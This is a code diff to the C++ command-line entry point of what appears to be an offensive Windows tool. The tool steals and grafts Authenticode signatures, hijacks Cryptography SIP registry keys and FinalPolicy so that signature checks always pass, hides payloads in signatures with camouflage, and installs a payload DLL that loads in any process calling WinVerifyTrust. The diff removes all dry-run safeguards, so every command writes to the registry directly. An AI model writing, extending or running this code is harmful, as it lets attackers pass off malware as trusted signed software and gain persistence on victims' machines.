@@ -76,7 +76,6 @@ void print_steal_help(const char* exe) {
         "Steal the Authenticode signature from <donor> and graft it onto <target>.\n\n"
         "Options:\n"
         "  --clone       Also clone metadata (icons, version info, manifest)\n"
-        "  --dry-run     Print what would happen without writing\n"
         "  -v            Verbose output\n",
         exe);
 }
@@ -93,7 +92,6 @@ void print_hijack_help(const char* exe) {
         "  --sac               Include Smart App Control SIP (Win11)\n"
         "  --all-sips          Hijack all 19 SIP GUIDs\n"
         "  --wow64-only        Write only to WOW6432Node (affects 32-bit callers)\n"
-        "  --dry-run           Print what would happen without writing\n"
         "  --clean             Reverse: restore hijacked keys to defaults\n"
         "  -v                  Verbose output\n",
         exe);
@@ -108,7 +106,6 @@ void print_embed_help(const char* exe) {
         "  --camouflage     Wrap payload as fake SPC_NESTED_SIGNATURE\n"
         "  --oid <oid>      Custom OID (default: 1.3.6.1.4.1.311.99.1)\n"
         "  --signer-index N Target WIN_CERTIFICATE entry (-1 = last, 0 = first)\n"
-        "  --dry-run        Show what would happen without writing\n"
         "  -v               Verbose output\n",
         exe);
 }
@@ -137,10 +134,8 @@ void print_sipexec_help(const char* exe) {
         "Install options:\n"
         "  --dll <path>      Full path to the payload DLL on target\n"
         "  --guid <alias>    SIP GUID or alias (pe, ps1, jscript, vbscript, ...)\n"
-        "  --dry-run         Print what would happen without writing\n\n"
         "Remove options:\n"
         "  --guid <alias>    SIP GUID or alias to remove\n"
-        "  --dry-run         Print what would happen without writing\n\n"
         "Shortcut: 'sip-exec --clean --guid <alias>' is the same as remove.\n\n"
         "Aliases: pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac\n",
         exe);
@@ -155,7 +150,6 @@ void print_clean_help(const char* exe) {
         "  --finalpolicy     Restore FinalPolicy to SoftpubAuthenticode\n"
         "  --custom-provider <GUID>  Remove a specific custom trust provider\n"
         "  --all             Restore SIP keys + FinalPolicy (full cleanup)\n"
-        "  --dry-run         Print what would happen without writing\n"
         "  -v                Verbose output\n\n"
         "With no flags, prints this help. At least one scope flag is required.\n",
         exe);
@@ -184,11 +178,9 @@ int main(int argc, char* argv[]) {
 
     // Global flags consumed anywhere in argv
     bool verbose = false;
-    bool dry_run = false;
     bool clean_flag = false;
     for (int i = 2; i < argc; i++) {
         if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) verbose = true;
-        if (strcmp(argv[i], "--dry-run") == 0) dry_run = true;
         if (strcmp(argv[i], "--clean") == 0) clean_flag = true;
     }
     g_verbose = verbose;
@@ -212,12 +204,6 @@ int main(int argc, char* argv[]) {
         }
 
         if (donor.empty() || target.empty()) { print_steal_help(argv[0]); return 1; }
-
-        if (dry_run) {
-            std::printf("[dry-run] Would steal signature from %s to %s\n", donor.c_str(), target.c_str());
-            if (do_clone) std::printf("[dry-run] Would clone metadata\n");
-            return 0;
-        }
 
         if (do_clone) {
             if (!clone_metadata(donor, target))
@@ -255,19 +241,16 @@ int main(int argc, char* argv[]) {
         if (clean_flag) {
             bool did_something = false;
             if (do_finalpolicy) {
-                if (dry_run) { std::printf("[dry-run] Would restore FinalPolicy\n"); }
-                else { cleanup_finalpolicy(); std::printf("[+] FinalPolicy restored.\n"); did_something = true; }
+                cleanup_finalpolicy(); std::printf("[+] FinalPolicy restored.\n"); did_something = true;
             }
             if (!custom_guid.empty()) {
                 std::wstring wguid(custom_guid.begin(), custom_guid.end());
-                if (dry_run) { std::wprintf(L"[dry-run] Would remove custom provider %ls\n", normalize_provider_guid(wguid).c_str()); }
-                else { cleanup_custom_provider(wguid); std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str()); did_something = true; }
+                cleanup_custom_provider(wguid); std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str()); did_something = true;
             }
             if (!do_finalpolicy && custom_guid.empty()) {
                 auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
                 if (sips.empty()) { for (int j = 0; j < NUM_STANDARD_SIPS; j++) sips.push_back(ALL_STANDARD_SIPS[j]); }
-                if (dry_run) { std::printf("[dry-run] Would restore %zu SIP keys\n", sips.size()); }
-                else { cleanup_registry(sips); std::printf("[+] SIP persistence removed (%zu entries).\n", sips.size()); did_something = true; }
+                cleanup_registry(sips); std::printf("[+] SIP persistence removed (%zu entries).\n", sips.size()); did_something = true;
             }
             if (did_something) std::printf("[!] Restart affected processes for changes to take effect.\n");
             return 0;
@@ -280,10 +263,6 @@ int main(int argc, char* argv[]) {
         }
 
         if (do_finalpolicy) {
-            if (dry_run) {
-                std::printf("[dry-run] Would redirect FinalPolicy to SoftpubCleanup\n");
-                return 0;
-            }
             if (!hijack_finalpolicy()) { err("RegCreateKeyExW", 0, "FinalPolicy write failed."); return 1; }
             std::printf("[+] FinalPolicy hijacked. All signature checks return success.\n");
             std::printf("[!] Stolen signatures show verified publisher (Subject CN from cert).\n");
@@ -294,11 +273,6 @@ int main(int argc, char* argv[]) {
 
         if (!custom_guid.empty()) {
             std::wstring wguid(custom_guid.begin(), custom_guid.end());
-            if (dry_run) {
-                std::wprintf(L"[dry-run] Would register custom provider %ls with SoftpubCleanup\n",
-                             normalize_provider_guid(wguid).c_str());
-                return 0;
-            }
             if (!hijack_custom_provider(wguid)) { err("RegCreateKeyExW", 0, "Custom provider write failed."); return 1; }
             std::wstring norm = normalize_provider_guid(wguid);
             std::wprintf(L"[+] Custom trust provider registered: %ls\n", norm.c_str());
@@ -309,14 +283,6 @@ int main(int argc, char* argv[]) {
         // Default: SIP hijack
         auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
         if (sips.empty()) return 1;
-
-        if (dry_run) {
-            std::printf("[dry-run] Would hijack %zu SIP type(s):", sips.size());
-            for (auto& s : sips) std::wprintf(L" %ls", s.name);
-            std::printf("\n");
-            if (wow64_only) std::printf("[dry-run] WOW64-only mode\n");
-            return 0;
-        }
 
         std::printf("[*] Installing SIP persistence for %zu type(s):", sips.size());
         for (auto& s : sips) std::wprintf(L" %ls", s.name);
@@ -347,13 +313,6 @@ int main(int argc, char* argv[]) {
             else if (strcmp(argv[i], "--signer-index") == 0 && i+1 < argc) signer_index = atoi(argv[++i]);
         }
 
-        if (dry_run) {
-            std::printf("[dry-run] Would embed %s into %s -> %s (camouflage=%s, oid=%s)\n",
-                        payload_path.c_str(), signed_pe.c_str(), output.c_str(),
-                        camouflage ? "yes" : "no", oid.c_str());
-            return 0;
-        }
-
         if (!pkcs7::embed(signed_pe, payload_path, output, oid, camouflage, verbose)) return 1;
         // ponytail: signer_index support requires pkcs7_embed.h multi-entry API (Python has it, C++ deferred)
         (void)signer_index;
@@ -379,7 +338,6 @@ int main(int argc, char* argv[]) {
     }
 
     // ================================================================
-    // sip-exec install|remove|list [--dll] [--guid] [--dry-run]
     // ================================================================
     if (strcmp(cmd, "sip-exec") == 0) {
         if (argc < 3 && !clean_flag) { print_sipexec_help(argv[0]); return 1; }
@@ -420,19 +378,6 @@ int main(int argc, char* argv[]) {
             std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\";
             subkey += wguid;
 
-            if (dry_run) {
-                std::printf("[dry-run] Would install payload DLL as SIP trigger\n");
-                std::wprintf(L"  GUID:       %ls", wguid.c_str());
-                if (resolved) std::printf(" (alias: %s)", guid_input.c_str());
-                std::printf("\n");
-                std::printf("  Triggers:   %s\n", extensions);
-                std::printf("  Payload:    %s\n", dll_path.c_str());
-                std::printf("  Loads in:   Any process calling WinVerifyTrust on matching files\n");
-                return 0;
-            }
-
-            // Write registry: Dll and FuncName
-            // ponytail: reuse SetRegistryValues with the internal function name
             if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), dll_w.c_str(), L"IsMyFileType2", KEY_WOW64_64KEY)) {
                 err("RegCreateKeyExW", 0, "Failed to install SIP trigger.");
                 return 1;
@@ -462,11 +407,6 @@ int main(int argc, char* argv[]) {
 
             std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\";
             subkey += wguid;
-
-            if (dry_run) {
-                std::wprintf(L"[dry-run] Would remove SIP trigger: %ls\n", wguid.c_str());
-                return 0;
-            }
 
             LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
             if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
@@ -572,35 +512,22 @@ int main(int argc, char* argv[]) {
             for (int i = 0; i < NUM_STANDARD_SIPS; i++) all.push_back(ALL_STANDARD_SIPS[i]);
             all.push_back(SAC_SIP);
             all.push_back(WIN11_SIP);
-
-            if (dry_run) {
-                std::printf("[dry-run] Would restore %zu SIP registry keys to defaults\n", all.size());
-            } else {
-                cleanup_registry(all);
-                std::printf("[+] SIP registry keys restored to defaults (%zu entries).\n", all.size());
-            }
+            cleanup_registry(all);
+            std::printf("[+] SIP registry keys restored to defaults (%zu entries).\n", all.size());
         }
 
         if (do_fp) {
-            if (dry_run) {
-                std::printf("[dry-run] Would restore FinalPolicy to SoftpubAuthenticode\n");
-            } else {
-                cleanup_finalpolicy();
-                std::printf("[+] FinalPolicy restored to SoftpubAuthenticode.\n");
-            }
+            cleanup_finalpolicy();
+            std::printf("[+] FinalPolicy restored to SoftpubAuthenticode.\n");
         }
 
         if (!custom_guid.empty()) {
             std::wstring wguid(custom_guid.begin(), custom_guid.end());
-            if (dry_run) {
-                std::wprintf(L"[dry-run] Would remove custom provider %ls\n", normalize_provider_guid(wguid).c_str());
-            } else {
-                cleanup_custom_provider(wguid);
-                std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str());
-            }
+            cleanup_custom_provider(wguid);
+            std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str());
         }
 
-        if (!dry_run) std::printf("[!] Restart affected processes for changes to take effect.\n");
+        std::printf("[!] Restart affected processes for changes to take effect.\n");
         return 0;
     }
 
